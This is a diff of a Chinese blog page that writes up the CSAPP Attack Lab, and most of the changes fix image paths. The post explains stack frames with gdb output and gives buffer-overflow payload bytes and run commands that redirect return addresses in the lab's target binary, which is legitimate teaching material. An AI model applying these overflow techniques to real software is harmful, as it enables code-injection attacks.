@@ -20,40 +20,40 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.12.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="CSAPP lab3(Attack Lab)1时间：2022.7.5上午-2022.7.7上午  函数调用栈讲解首先明白栈这个内存结构，它先入后出，同时进行push的时候地址是减小的，也就是说栈顶地址最小，栈底地址最大。在x86-64中采用栈指针寄存器%rsp指向栈顶，如下图所示。   假设初始rsp为红色，执行pushq src代码，进行入栈操作，红色变为蓝色：  取出src的操作码 sub $">
+    <meta name="description" content="CSAPP lab3(Attack Lab)1时间：2022.7.5上午-2022.7.7上午  函数调用栈讲解首先明白栈这个内存结构，它先入后出，同时进行push的时候地址是减小的，也就是说栈顶地址最小，栈底地址最大。在x86-64中采用栈指针寄存器%rsp指向栈顶，如下图所示。  假设初始rsp为红色，执行pushq src代码，进行入栈操作，红色变为蓝色：  取出src的操作码 sub $0">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CSAPP Lab3(Attack Lab)">
 <meta property="og:url" content="http://example.com/2022/07/11/CSAPP-Lab3-Attack-Lab/index.html">
 <meta property="og:site_name" content="洗衣机随想录">
-<meta property="og:description" content="CSAPP lab3(Attack Lab)1时间：2022.7.5上午-2022.7.7上午  函数调用栈讲解首先明白栈这个内存结构，它先入后出，同时进行push的时候地址是减小的，也就是说栈顶地址最小，栈底地址最大。在x86-64中采用栈指针寄存器%rsp指向栈顶，如下图所示。   假设初始rsp为红色，执行pushq src代码，进行入栈操作，红色变为蓝色：  取出src的操作码 sub $">
+<meta property="og:description" content="CSAPP lab3(Attack Lab)1时间：2022.7.5上午-2022.7.7上午  函数调用栈讲解首先明白栈这个内存结构，它先入后出，同时进行push的时候地址是减小的，也就是说栈顶地址最小，栈底地址最大。在x86-64中采用栈指针寄存器%rsp指向栈顶，如下图所示。  假设初始rsp为红色，执行pushq src代码，进行入栈操作，红色变为蓝色：  取出src的操作码 sub $0">
 <meta property="og:locale">
-<meta property="og:image" content="http://example.com/.com//BlogFiles/myblog/source/_posts/test/14611673348513.jpg">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/1433829-9e5c22084af91329.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/528/format/webp">
-<meta property="og:image" content="http://example.com/.com//Users/余新宇/AppData/Roaming/Typora/typora-user-images/image-20220705172212129.png">
-<meta property="og:image" content="http://example.com/.com//Users/余新宇/AppData/Roaming/Typora/typora-user-images/image-20220705172255110.png">
-<meta property="og:image" content="http://example.com/.com//Users/余新宇/AppData/Roaming/Typora/typora-user-images/image-20220705172341843.png">
-<meta property="og:image" content="http://example.com/.com//Users/余新宇/AppData/Roaming/Typora/typora-user-images/image-20220705172516700.png">
-<meta property="og:image" content="http://example.com/.com//Users/余新宇/AppData/Roaming/Typora/typora-user-images/image-20220705172606171.png">
-<meta property="og:image" content="http://example.com/.com//Users/余新宇/AppData/Roaming/Typora/typora-user-images/image-20220705173521674.png">
-<meta property="og:image" content="http://example.com/.com//Users/余新宇/AppData/Roaming/Typora/typora-user-images/image-20220705102052221.png">
-<meta property="og:image" content="http://example.com/.com//Users/余新宇/AppData/Roaming/Typora/typora-user-images/image-20220705220617260.png">
-<meta property="og:image" content="http://example.com/.com//Users/余新宇/AppData/Roaming/Typora/typora-user-images/image-20220705200352770.png">
-<meta property="og:image" content="http://example.com/.com//Users/余新宇/AppData/Roaming/Typora/typora-user-images/image-20220705200811222.png">
-<meta property="og:image" content="http://example.com/.com//Users/余新宇/AppData/Roaming/Typora/typora-user-images/image-20220705200840499.png">
-<meta property="og:image" content="http://example.com/.com//Users/余新宇/AppData/Roaming/Typora/typora-user-images/image-20220707164025576.png">
-<meta property="og:image" content="http://example.com/.com//Users/余新宇/AppData/Roaming/Typora/typora-user-images/image-20220707164006465.png">
-<meta property="og:image" content="http://example.com/.com//Users/余新宇/AppData/Roaming/Typora/typora-user-images/image-20220707170244255.png">
-<meta property="og:image" content="https://wdxtub.com/images/csapp/14554587074206.jpg">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/1433829-45d42fcf3d5bcca4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/568/format/webp">
-<meta property="og:image" content="http://example.com/.com//Users/余新宇/AppData/Roaming/Typora/typora-user-images/image-20220707213503552.png">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/1433829-cafcf76d35ef7ba1.png?imageMogr2/auto-orient/strip|imageView2/2/w/562/format/webp">
-<meta property="og:image" content="http://example.com/.com//Users/余新宇/AppData/Roaming/Typora/typora-user-images/image-20220708110212930.png">
+<meta property="og:image" content="http://example.com/2022/07/11/CSAPP-Lab3-Attack-Lab/1.jpg">
+<meta property="og:image" content="http://example.com/2022/07/11/CSAPP-Lab3-Attack-Lab/2.jpg">
+<meta property="og:image" content="http://example.com/2022/07/11/CSAPP-Lab3-Attack-Lab/3.jpg">
+<meta property="og:image" content="http://example.com/2022/07/11/CSAPP-Lab3-Attack-Lab/4.jpg">
+<meta property="og:image" content="http://example.com/2022/07/11/CSAPP-Lab3-Attack-Lab/5.jpg">
+<meta property="og:image" content="http://example.com/2022/07/11/CSAPP-Lab3-Attack-Lab/6.jpg">
+<meta property="og:image" content="http://example.com/2022/07/11/CSAPP-Lab3-Attack-Lab/7.jpg">
+<meta property="og:image" content="http://example.com/2022/07/11/CSAPP-Lab3-Attack-Lab/8.jpg">
+<meta property="og:image" content="http://example.com/2022/07/11/CSAPP-Lab3-Attack-Lab/9.jpg">
+<meta property="og:image" content="http://example.com/2022/07/11/CSAPP-Lab3-Attack-Lab/10.jpg">
+<meta property="og:image" content="http://example.com/2022/07/11/CSAPP-Lab3-Attack-Lab/11.jpg">
+<meta property="og:image" content="http://example.com/2022/07/11/CSAPP-Lab3-Attack-Lab/12.jpg">
+<meta property="og:image" content="http://example.com/2022/07/11/CSAPP-Lab3-Attack-Lab/13.jpg">
+<meta property="og:image" content="http://example.com/2022/07/11/CSAPP-Lab3-Attack-Lab/14.jpg">
+<meta property="og:image" content="http://example.com/2022/07/11/CSAPP-Lab3-Attack-Lab/15.jpg">
+<meta property="og:image" content="http://example.com/2022/07/11/CSAPP-Lab3-Attack-Lab/16.jpg">
+<meta property="og:image" content="http://example.com/2022/07/11/CSAPP-Lab3-Attack-Lab/17.jpg">
+<meta property="og:image" content="http://example.com/2022/07/11/CSAPP-Lab3-Attack-Lab/18.jpg">
+<meta property="og:image" content="http://example.com/2022/07/11/CSAPP-Lab3-Attack-Lab/19.jpg">
+<meta property="og:image" content="http://example.com/2022/07/11/CSAPP-Lab3-Attack-Lab/20.jpg">
+<meta property="og:image" content="http://example.com/2022/07/11/CSAPP-Lab3-Attack-Lab/21.jpg">
 <meta property="article:published_time" content="2022-07-11T12:50:40.000Z">
-<meta property="article:modified_time" content="2022-07-11T13:55:01.111Z">
+<meta property="article:modified_time" content="2022-07-11T14:55:56.282Z">
 <meta property="article:author" content="Xinyi">
 <meta property="article:tag" content="CSAPP">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/.com//BlogFiles/myblog/source/_posts/test/14611673348513.jpg">
+<meta name="twitter:image" content="http://example.com/2022/07/11/CSAPP-Lab3-Attack-Lab/1.jpg">
 
 
 <link rel="canonical" href="http://example.com/2022/07/11/CSAPP-Lab3-Attack-Lab/">
@@ -152,7 +152,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-count">4</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -232,7 +232,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2022-07-11 20:50:40 / 修改时间：21:55:01" itemprop="dateCreated datePublished" datetime="2022-07-11T20:50:40+08:00">2022-07-11</time>
+      <time title="创建时间：2022-07-11 20:50:40 / 修改时间：22:55:56" itemprop="dateCreated datePublished" datetime="2022-07-11T20:50:40+08:00">2022-07-11</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -257,8 +257,7 @@
         <h2 id="CSAPP-lab3-Attack-Lab"><a href="#CSAPP-lab3-Attack-Lab" class="headerlink" title="CSAPP lab3(Attack Lab)"></a>CSAPP lab3(Attack Lab)</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">时间：<span class="number">2022.7</span><span class="number">.5</span>上午<span class="number">-2022.7</span><span class="number">.7</span>上午</span><br></pre></td></tr></table></figure>
 
 <h3 id="函数调用栈讲解"><a href="#函数调用栈讲解" class="headerlink" title="函数调用栈讲解"></a>函数调用栈讲解</h3><p>首先明白栈这个内存结构，它先入后出，同时进行push的时候地址是减小的，也就是说栈顶地址最小，栈底地址最大。在x86-64中采用栈指针寄存器%rsp指向栈顶，如下图所示。</p>
-<img src="/.com//BlogFiles\myblog\source\_posts\test\14611673348513.jpg" alt="img" style="zoom:50%;">
-
+<p><img src="/2022/07/11/CSAPP-Lab3-Attack-Lab/1.jpg"></p>
 <p>假设初始rsp为红色，执行pushq src代码，进行<strong>入栈操作</strong>，红色变为蓝色：</p>
 <ol>
 <li>取出src的操作码</li>
@@ -275,21 +274,21 @@
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">echo</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">custom_gets</span>(buf);</span><br><span class="line">    <span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="built_in">echo</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//echo对应汇编</span></span><br><span class="line">echo:</span><br><span class="line">    subq    $<span class="number">24</span>, %rsp</span><br><span class="line">    movq    %rsp, %rdi</span><br><span class="line">    call    custom_gets</span><br><span class="line">    movq    %rsp, %rdi</span><br><span class="line">    call    puts</span><br><span class="line">    addq    $<span class="number">24</span>, %rsp</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>
 
 <p>可以画出如图所示的函数调用栈：</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/1433829-9e5c22084af91329.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/528/format/webp" alt="img"></p>
+<p><img src="/2022/07/11/CSAPP-Lab3-Attack-Lab/2.jpg"></p>
 <p>图中所示的调用者为main函数，%rsp为执行操作sub $0x18,%rsp之后的新值。正常情况下执行完echo()前面语句之后，到达addq $24,%rsp语句，到达原来的返回地址（图上标注），然后执行ret操作：从栈顶处取出值，寄存器做对应修改，以接着调用者调用完成函数之后的<strong>下一步</strong>开始执行，对于汇编代码来说，这个返回地址存的是<strong>callq之后下一条语句</strong>的地址，以达到返回调用函数之后正常执行的目的。</p>
 <p><strong>正常调用过程用该实验代码来进行讲解</strong></p>
 <p>test()调用getbuf()，将二者都反编译如下：</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*test函数反编译*/</span></span><br><span class="line">(gdb) disas test</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function test:</span><br><span class="line">   <span class="number">0x0000000000401968</span> &lt;+<span class="number">0</span>&gt;:		sub    $<span class="number">0x8</span>,%rsp</span><br><span class="line">   <span class="number">0x000000000040196c</span> &lt;+<span class="number">4</span>&gt;:		mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">   <span class="number">0x0000000000401971</span> &lt;+<span class="number">9</span>&gt;:		callq  <span class="number">0x4017a8</span> &lt;getbuf&gt;</span><br><span class="line">   <span class="number">0x0000000000401976</span> &lt;+<span class="number">14</span>&gt;:	mov    %eax,%edx</span><br><span class="line">   <span class="number">0x0000000000401978</span> &lt;+<span class="number">16</span>&gt;:	mov    $<span class="number">0x403188</span>,%esi</span><br><span class="line">   <span class="number">0x000000000040197d</span> &lt;+<span class="number">21</span>&gt;:	mov    $<span class="number">0x1</span>,%edi</span><br><span class="line">   <span class="number">0x0000000000401982</span> &lt;+<span class="number">26</span>&gt;:	mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">   <span class="number">0x0000000000401987</span> &lt;+<span class="number">31</span>&gt;:	callq  <span class="number">0x400df0</span> &lt;__printf_chk@plt&gt;</span><br><span class="line">   <span class="number">0x000000000040198c</span> &lt;+<span class="number">36</span>&gt;:	add    $<span class="number">0x8</span>,%rsp</span><br><span class="line">   <span class="number">0x0000000000401990</span> &lt;+<span class="number">40</span>&gt;:	retq </span><br><span class="line">       </span><br><span class="line"><span class="comment">/*getbuf函数反编译*/</span></span><br><span class="line">(gdb) disas getbuf</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function getbuf:</span><br><span class="line">   <span class="number">0x00000000004017a8</span> &lt;+<span class="number">0</span>&gt;:		sub    $<span class="number">0x28</span>,%rsp<span class="comment">//分配了40个字节</span></span><br><span class="line">   <span class="number">0x00000000004017ac</span> &lt;+<span class="number">4</span>&gt;:		mov    %rsp,%rdi</span><br><span class="line">   <span class="number">0x00000000004017af</span> &lt;+<span class="number">7</span>&gt;:		callq  <span class="number">0x401a40</span> &lt;Gets&gt;</span><br><span class="line">   <span class="number">0x00000000004017b4</span> &lt;+<span class="number">12</span>&gt;:	mov    $<span class="number">0x1</span>,%eax</span><br><span class="line">   <span class="number">0x00000000004017b9</span> &lt;+<span class="number">17</span>&gt;:	add    $<span class="number">0x28</span>,%rsp<span class="comment">//断点</span></span><br><span class="line">   <span class="number">0x00000000004017bd</span> &lt;+<span class="number">21</span>&gt;:	retq        </span><br></pre></td></tr></table></figure>
 
-<p>在0x00000000004017b9处设置断点，<img src="/.com//Users\余新宇\AppData\Roaming\Typora\typora-user-images\image-20220705172212129.png" alt="image-20220705172212129"></p>
-<p>反编译：<img src="/.com//Users\余新宇\AppData\Roaming\Typora\typora-user-images\image-20220705172255110.png" alt="image-20220705172255110"></p>
-<p>看一下寄存器的状态：<img src="/.com//Users\余新宇\AppData\Roaming\Typora\typora-user-images\image-20220705172341843.png" alt="image-20220705172341843"></p>
-<p>主要关注栈顶指针rsp存0x5561dc78，指向要进行操作的地址的指针rip存0x4017b9，也就是我们设置断点的地方：<img src="/.com//Users\余新宇\AppData\Roaming\Typora\typora-user-images\image-20220705172516700.png" alt="image-20220705172516700"></p>
-<p>将程序单步调试一下：<img src="/.com//Users\余新宇\AppData\Roaming\Typora\typora-user-images\image-20220705172606171.png" alt="image-20220705172606171"></p>
+<p>在0x00000000004017b9处设置断点，<img src="/2022/07/11/CSAPP-Lab3-Attack-Lab/3.jpg"></p>
+<p>反编译：<img src="/2022/07/11/CSAPP-Lab3-Attack-Lab/4.jpg"></p>
+<p>看一下寄存器的状态：<img src="/2022/07/11/CSAPP-Lab3-Attack-Lab/5.jpg"></p>
+<p>主要关注栈顶指针rsp存0x5561dc78，指向要进行操作的地址的指针rip存0x4017b9，也就是我们设置断点的地方：<img src="/2022/07/11/CSAPP-Lab3-Attack-Lab/6.jpg"></p>
+<p>将程序单步调试一下：<img src="/2022/07/11/CSAPP-Lab3-Attack-Lab/7.jpg"></p>
 <p>此时栈顶寄存器rsp存0x5561dca0（栈顶地址，对存的这个栈顶地址取值就是要返回的语句地址，即下一条语句地址），要进行的操作地址为rip中的0x4017bd，也就是最后的ret操作.</p>
 <p>按照上面的理论，现在$rsp&#x3D;0x5561dca0，那么其中存的就是下一条语句的地址，根据test()的汇编代码，应该是   0x0000000000401976 &lt;+14&gt;:	mov    %eax,%edx</p>
 <p>现在检查$rsp：</p>
-<p><img src="/.com//Users\余新宇\AppData\Roaming\Typora\typora-user-images\image-20220705173521674.png" alt="image-20220705173521674"></p>
+<p><img src="/2022/07/11/CSAPP-Lab3-Attack-Lab/8.jpg"></p>
 <p>可以看到正是调用函数之后下一条语句的地址。</p>
 <h3 id="代码注入攻击"><a href="#代码注入攻击" class="headerlink" title="代码注入攻击"></a>代码注入攻击</h3><p>需要注意的是这个实验有一个官方文档<a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/attacklab.pdf%EF%BC%8C%E5%86%99%E4%BA%86%E5%87%A0%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84c%E8%AF%AD%E8%A8%80%E7%89%88%E6%9C%AC%EF%BC%8C%E4%BE%BF%E4%BA%8E%E7%90%86%E8%A7%A3%E3%80%82">http://csapp.cs.cmu.edu/3e/attacklab.pdf，写了几个函数的c语言版本，便于理解。</a></p>
 <h4 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h4><p><strong>这一段攻击代码是通过getbuf的参数形式注入的</strong></p>
@@ -308,7 +307,7 @@
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//40个字节空间</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="comment">//修改返回地址</span></span><br><span class="line">c0 <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="comment">//小端写法</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//答案</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> c0 <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
 
 <p>创建一个文件p1.txt存字符串方便输入，并用.&#x2F;hex2raw &lt; p1.txt &gt; p1r.txt转化为字节码，再执行.&#x2F;ctarget -qi p1r.txt，得到如下结果：</p>
-<p><img src="/.com//Users\余新宇\AppData\Roaming\Typora\typora-user-images\image-20220705102052221.png" alt="image-20220705102052221"></p>
+<p><img src="/2022/07/11/CSAPP-Lab3-Attack-Lab/9.jpg"></p>
 <p>需要注意的是有的教程最后使用.&#x2F;ctarget -i p1r.txt报错“FAILED: Initialization error: Running on an illegal host [ubuntu]”，这个问题在文档解决的时候有一句话“ when running executables <code>./ctarget</code> and <code>./rtarget</code>?</p>
 <p>  Include the <code>-q</code> flag which prevents program from contacting non-existent grading server in addition to the above   error.”</p>
 <p>也就是出问题的时候加上-q，根据-h时显示的帮助，-qi即可完成最终效果如上。</p>
@@ -339,18 +338,18 @@
 
 <p>字符串转化为字节码：.&#x2F;hex2raw &lt; p2.txt &gt; p2r.txt <strong>（！！！！莫名其妙这个语句生成的p2r.txt为空，所以暂时这个没有执行成功，只是理论上分析正确）→ （删除文件夹再解压之后可以了，可能是某些文件or代码被修改）</strong></p>
 <p>执行命令：.&#x2F;ctarget -qi p2r.txt</p>
-<p><img src="/.com//Users\余新宇\AppData\Roaming\Typora\typora-user-images\image-20220705220617260.png" alt="image-20220705220617260"></p>
+<p><img src="/2022/07/11/CSAPP-Lab3-Attack-Lab/10.jpg"></p>
 <p>可以看到level2 PASS</p>
 <p>查看touch2开始地址，注释部分即为起始地址：</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//touch2对应的汇编</span></span><br><span class="line">(gdb) disas touch2</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function touch2:</span><br><span class="line">   <span class="number">0x00000000004017ec</span> &lt;+<span class="number">0</span>&gt;:		sub    $<span class="number">0x8</span>,%rsp<span class="comment">//起始地址0x00000000004017ec</span></span><br><span class="line">   <span class="number">0x00000000004017f0</span> &lt;+<span class="number">4</span>&gt;:		mov    %edi,%edx</span><br><span class="line">   <span class="number">0x00000000004017f2</span> &lt;+<span class="number">6</span>&gt;:		movl   $<span class="number">0x2</span>,<span class="number">0x202ce0</span>(%rip)        # <span class="number">0x6044dc</span> &lt;vlevel&gt;</span><br><span class="line">   <span class="number">0x00000000004017fc</span> &lt;+<span class="number">16</span>&gt;:	cmp    <span class="number">0x202ce2</span>(%rip),%edi        # <span class="number">0x6044e4</span> &lt;cookie&gt;</span><br><span class="line">   <span class="number">0x0000000000401802</span> &lt;+<span class="number">22</span>&gt;:	jne    <span class="number">0x401824</span> &lt;touch2+<span class="number">56</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401804</span> &lt;+<span class="number">24</span>&gt;:	mov    $<span class="number">0x4030e8</span>,%esi</span><br><span class="line">   <span class="number">0x0000000000401809</span> &lt;+<span class="number">29</span>&gt;:	mov    $<span class="number">0x1</span>,%edi</span><br><span class="line">   <span class="number">0x000000000040180e</span> &lt;+<span class="number">34</span>&gt;:	mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">   <span class="number">0x0000000000401813</span> &lt;+<span class="number">39</span>&gt;:	callq  <span class="number">0x400df0</span> &lt;__printf_chk@plt&gt;</span><br><span class="line">   <span class="number">0x0000000000401818</span> &lt;+<span class="number">44</span>&gt;:	mov    $<span class="number">0x2</span>,%edi</span><br><span class="line">   <span class="number">0x000000000040181d</span> &lt;+<span class="number">49</span>&gt;:	callq  <span class="number">0x401c8d</span> &lt;validate&gt;</span><br><span class="line">   <span class="number">0x0000000000401822</span> &lt;+<span class="number">54</span>&gt;:	jmp    <span class="number">0x401842</span> &lt;touch2+<span class="number">86</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401824</span> &lt;+<span class="number">56</span>&gt;:	mov    $<span class="number">0x403110</span>,%esi</span><br><span class="line">   <span class="number">0x0000000000401829</span> &lt;+<span class="number">61</span>&gt;:	mov    $<span class="number">0x1</span>,%edi</span><br><span class="line">   <span class="number">0x000000000040182e</span> &lt;+<span class="number">66</span>&gt;:	mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">   <span class="number">0x0000000000401833</span> &lt;+<span class="number">71</span>&gt;:	callq  <span class="number">0x400df0</span> &lt;__printf_chk@plt&gt;</span><br><span class="line">   <span class="number">0x0000000000401838</span> &lt;+<span class="number">76</span>&gt;:	mov    $<span class="number">0x2</span>,%edi</span><br><span class="line">   <span class="number">0x000000000040183d</span> &lt;+<span class="number">81</span>&gt;:	callq  <span class="number">0x401d4f</span> &lt;fail&gt;</span><br><span class="line">   <span class="number">0x0000000000401842</span> &lt;+<span class="number">86</span>&gt;:	mov    $<span class="number">0x0</span>,%edi</span><br><span class="line">   <span class="number">0x0000000000401847</span> &lt;+<span class="number">91</span>&gt;:	callq  <span class="number">0x400e40</span> &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
 
 <p>找到注入代码的起始地址，也就是getbuf申请40字节值后的rsp值：</p>
 <p>在getbuf处设置一个断点：</p>
-<p><img src="/.com//Users\余新宇\AppData\Roaming\Typora\typora-user-images\image-20220705200352770.png" alt="image-20220705200352770"></p>
+<p><img src="/2022/07/11/CSAPP-Lab3-Attack-Lab/11.jpg"></p>
 <p>进入断点并单步调试后：</p>
-<p><img src="/.com//Users\余新宇\AppData\Roaming\Typora\typora-user-images\image-20220705200811222.png" alt="image-20220705200811222"></p>
+<p><img src="/2022/07/11/CSAPP-Lab3-Attack-Lab/12.jpg"></p>
 <p>此时查看寄存器：</p>
-<p><img src="/.com//Users\余新宇\AppData\Roaming\Typora\typora-user-images\image-20220705200840499.png" alt="image-20220705200840499"></p>
+<p><img src="/2022/07/11/CSAPP-Lab3-Attack-Lab/13.jpg"></p>
 <p>可以看到已经申请了40字节的空间，下一个要执行语句为0x00000000004017ac &lt;+4&gt;:	mov    %rsp,%rdi</p>
 <p>此时%rsp值为0x5561dc78，是申请空间的起始值，也是注入代码的起始地址。</p>
 <h4 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h4><p><strong>基本思路</strong>：目的是要调用touch3，然后输出成功语句。</p>
@@ -363,8 +362,8 @@
 <p>我们要把这个十六进制序列存入内存中的某个位置，然后把这位置的地址赋值为%rdi（文档中要求的寄存器），作为touch3调用的参数进行运算。因为hexmatch中地址随机开始一个地方，可能覆盖getbuf中的某个位置，所以保险做法是利用test栈帧中的空间来存这个序列。</p>
 <p>根据level2可以知道getbuf分配了40个字节的空间，填满这40个字节空间后有一个8字节的rsp返回地址空间，这个rsp可以利用数组溢出填充分配给getbuf函数的40个字节的起始地址，从而运行我们填充在getbuf的空间内的机器指令。</p>
 <p>也就是说，getbuf分配空间之后的地址+48字节就是原test栈中的地址，这个地址不会被覆盖。如下所示，分配40字节后%rsp&#x3D;0x5561dc78（要填入返回地址中），+48字节应该为0x5561dca8（存放十六进制串），所以应该将十六进制序列存入这个地址。</p>
-<p><img src="/.com//Users\余新宇\AppData\Roaming\Typora\typora-user-images\image-20220707164025576.png" alt="image-20220707164025576"></p>
-<p><img src="/.com//Users\余新宇\AppData\Roaming\Typora\typora-user-images\image-20220707164006465.png" alt="image-20220707164006465"></p>
+<p><img src="/2022/07/11/CSAPP-Lab3-Attack-Lab/14.jpg"></p>
+<p><img src="/2022/07/11/CSAPP-Lab3-Attack-Lab/15.jpg"></p>
 <p>对应语句：</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movq $<span class="number">0x5561dca8</span>, %rdi</span><br></pre></td></tr></table></figure>
 
@@ -381,7 +380,7 @@
